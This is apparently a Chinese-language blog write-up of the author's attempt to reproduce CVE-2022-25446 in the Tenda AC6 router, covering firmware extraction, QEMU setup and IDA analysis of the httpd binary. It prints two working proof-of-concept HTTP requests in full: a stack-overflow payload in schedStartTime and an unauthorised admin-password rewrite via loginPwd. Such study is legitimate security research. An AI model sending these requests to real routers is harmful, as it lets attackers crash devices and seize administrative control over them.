---
title: 漏洞分析之CVE-2022-25446
date: 2022-04-14 14:08:00
tags:
    - 漏洞分析
---

<!--more-->

​		这两天暂时没有看《0day安全软件漏洞学习》，先把书告一段落，这两天对一个CVE有点感兴趣，有大佬推荐如果想实习可以尝试去漏洞复现，多锻炼与漏洞接触的情况。所以在vulhub找了一个cve，花了一天多的时间，虽然可能没有复现成功，但是去网上搜了很多资料，关于这个漏洞的仔细细节并没有人发布，我就记录一下我所能做到的事。

# CVE-2022-25446

## 漏洞简介

Tenda AC6是中国腾达（Tenda）公司的一款无线路由器。

Tenda AC6 15.03.05.09_multi版本 存在安全漏洞，该漏洞源于通过 openSchedWifi 函数中的 schedstarttime 参数发现Tenda AC6 15.03.05.09_multi版本 存在堆栈溢出。 （但是我在官网并没有找到15.03.05.09的版本）		

![image-20220414151148432](https://s2.loli.net/2022/04/14/16IFtAHvgVqy5a4.png)

我只能拿15.03.05.16的测试一下

## 分析固件

拿到的是一个zip文件包，里面是个bin文件

![image-20220414151411617](https://s2.loli.net/2022/04/14/oUHAr5hVxKLPGIs.png)

```
binwalk -Me bin文件
```

得

![image-20220414151704930](https://s2.loli.net/2022/04/14/rWfE57b1KPskwy4.png)

由于之前复现过一个华为路由器的漏洞，所以对这些文件很熟悉，根据漏洞简介中描述的漏洞点在openSchedWifi 函数，所以先用grep -r命令查找一下漏洞函数所在的漏洞文件。

![image-20220414151959433](https://s2.loli.net/2022/04/14/tRPzFBrjVYaOhgl.png)

可以看到是httpd文件，然后我想着是要配置一个虚拟环境去使这个固件运行，但是我配置qemu虚拟器运行这个文件的时候我发现运行不了（官方POC是直接买实体然后连接测试，硬性条件没办法）

```
启动qemu

sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic,macaddr=00:16:3e:00:00:01 -net tap
```

![image-20220414152301278](https://s2.loli.net/2022/04/14/CQHhyE5AIn2GKvj.png)

上网搜集了资料发现这是因为可执行文件不符合当前主机架构，因此需要在当前主机上再次编译生成可执行文件，但是我下载的固件文件中并没有httpd的原文件，（可能是我能力不足没找到）所以也无法进行重新编译。

## 配置qemu网络

创建QEMU的网络接口启动脚本（/etc/qemu-ifup）并保存为如下内容：

![img](https://s2.loli.net/2022/04/17/XLZEV6kg3bvBrQS.png)

赋予文件/etc/qemu-ifup 可执行权限：    

```
sudo chmod a+x /etc/qemu-ifup 
```

重启网络使所有的配置生效：    

```
sudo /etc/init.d/networking restart
```

关闭ens33，启动桥连网络br0

```
sudo ifdown eth0  sudo ifup br0
```

记录（这是在qemu里）：尝试过重启、重启网络、重启接口。给qemu配置新的网络192.168.188.130 （自己的ip号+1就可以，我自己的是192.168.188.129），可以实现主机和虚拟机之间互通

```
ifconfig eth1 192.168.188.130/24 up
```

为了方便在qemu上操作，可以在ubuntu上运行命令

直接操作虚拟机显然比较麻烦，在ubuntu上搞个SSH 连进来

```
ssh root@虚拟机ip
```

将之前解压的固件包拷贝到虚拟机里面：

```
scp -r ./squashfs-root root@虚拟机ip:/root/    
```

完成搭建路由器固件运行的环境。

## 分析漏洞文件

固件无法运行，那我只能分析漏洞文件，用file 查看之后是32位的文件，在ida中打开字符串列查找到openSchedWifi 

![image-20220414153623675](https://s2.loli.net/2022/04/14/3ItQx6GENyOWMYw.png)

追溯到

![image-20220414153715957](https://s2.loli.net/2022/04/14/eCcS2mDZ5u9arhg.png)

### 任意密码修改漏洞

根据官方POC，漏洞点在setSchedWifi这个函数， 首先，通过反向分析，我们可以发现接口中存在任意修改密码的漏洞。程序将loginpwd参数中获得的内容直接传递给V16，然后通过setvalue（）函数直接将密码更改为登录密码。这样，我们可以在未经授权的情况下更改管理密码。 

![image-20220414160742626](https://s2.loli.net/2022/04/14/sVBJgLyiplPvKT1.png)

它里面有个函数作用相当于字符串复制

![image-20220414160700720](https://s2.loli.net/2022/04/14/NlbH7DV6QCunKpo.png)

### 堆栈溢出漏洞

程序将schedstarttime获得的参数传递给Src

![image-20220414162822985](https://s2.loli.net/2022/04/14/N13MoCxPgJQ6vba.png)

之后，后面内容的内容直接复制到PTR+2堆栈中，没有大小限制，并且存在堆栈溢出漏洞

![image-20220414162928752](https://s2.loli.net/2022/04/14/l4BhMi7Fsn3HyeQ.png)

因为这里没有检查schedstarttime的参数大小，如果弄一个很大的值进去可以造成溢出，但是我觉得schedEndTime也存在同样的漏洞原理。因为没有实体路由器，只能用官方POC溢出攻击一下

## 溢出POC

```
POST /goform/openSchedWifi HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 2102
Origin: http://192.168.1.1
Connection: close
Referer: http://192.168.1.1/wifi_time.html?random=0.9871898533297786&
Cookie: password=7c90ed4e4d4bf1e300aa08103057ccbccvx1qw

schedWifiEnable=1&schedStartTime=00%3A00aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaeaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaeaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaeaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae&schedEndTime=01%3A00&timeType=0&day=1%2C1%2C1%2C1%2C1%2C1%2C1
```

结果

![image-20220414163710968](https://s2.loli.net/2022/04/14/CQeIdkL8OHMASDt.png)

## 密码重写POC（此处密码改为123456）

官方POC

```
POST /goform/fast_setting_wifi_set HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: /
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 116
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/index.html

ssid=Tenda_AC6_rencvn&wrlPassword=rencvn667&power=high&timeZone=%2B08%3A00&loginPwd=e10adc3949ba59abbe56e057f20f883e
```

![image-20220414164022515](https://s2.loli.net/2022/04/14/qkhKaEP18zIiwyS.png)

